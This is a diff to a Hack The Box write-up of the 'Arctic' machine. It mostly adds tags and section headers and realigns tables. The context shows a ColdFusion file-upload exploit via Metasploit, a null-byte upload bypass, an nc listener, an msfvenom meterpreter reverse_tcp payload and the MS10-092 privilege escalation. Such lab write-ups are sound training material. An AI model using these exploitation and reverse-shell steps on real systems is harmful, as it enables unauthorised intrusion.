@@ -10,10 +10,10 @@ categories:
 tags:
   - HTB
   - CTF
-  -
-  -
-  -
-  -
+  - ColdFusion
+  - msfconsole
+  - meterpreter
+  - chimichurri
 ---
 
 ## Machine Information
@@ -76,7 +76,11 @@ Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/ | exploits/cfm/webapps
 ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Met | exploits/cfm/webapps/16788.rb
 ```
 
-The bottom one looks good, with file upload and metasploit module it should be easy. Start msf and search:
+The bottom one looks good, with file upload and metasploit module it should be easy. 
+
+## Gaining Access
+
+Start msf and search:
 
 ```text
 root@kali:~/htb/machines/arctic# msfconsole
@@ -101,10 +105,10 @@ Module options (exploit/windows/http/coldfusion_fckeditor):
    ----           ---------------                                                             --------  -----------
    FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm
    Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                                                                                   yes       The target address range or CIDR identifier
-   RPORT          80                                                                       yes       The target port (TCP)
+   RHOSTS                                                                                     yes       The target address range or CIDR identifier
+   RPORT          80                                                                          yes       The target port (TCP)
    SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
-   VHOST                                                                                     no        HTTP server virtual host
+   VHOST                                                                                      no        HTTP server virtual host
 Exploit target:
    Id  Name
    --  ----
@@ -161,6 +165,8 @@ Send to Repeater and have a look:
 
 Using the null byte allowed the upload of the EU.jsp file as well as the WVSKVYWB.txt file.
 
+## Initial Shell
+
 On a new terminal start a nc listener:
 
 ```text
@@ -180,6 +186,8 @@ Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 ```
 
+## User Flag
+
 Let's see who we have connected as:
 
 ```text
@@ -195,6 +203,8 @@ C:\ColdFusion8\runtime\bin>more c:\users\tolis\Desktop\user.txt
 more c:\users\tolis\Desktop\user.txt
 <<HIDDEN>>
 ```
+
+## Privilege Escalation
 
 We are currently connected via a meterpreter shell as the user tolis. The next step is to upload a fully fledged reverse shell so we can get privilege escalation. Create a payload with msfvenom:
 
@@ -236,9 +246,9 @@ Module options (exploit/multi/handler):
 Payload options (windows/meterpreter/reverse_tcp):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
-   EXITFUNC  process        yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST                              yes       The listen address (an interface may be specified)
-   LPORT        4444             yes       The listen port
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
 Exploit target:
    Id  Name
    --  ----
@@ -336,6 +346,8 @@ msf5 exploit(windows/local/ms10_092_schelevator) > exploit
 [*] SCHELEVATOR
 ```
 
+## Root Flag
+
 Should now have a shell as root:
 
 ```text
@@ -358,7 +370,7 @@ meterpreter > cat root.txt
 <<HIDDEN>>
 ```
 
-## Alternative Method (not using MetaSploit)
+## Alternative Method (without Meterpreter)
 
 We already know the box is using Coldfusion, so we can look for another way in:
 
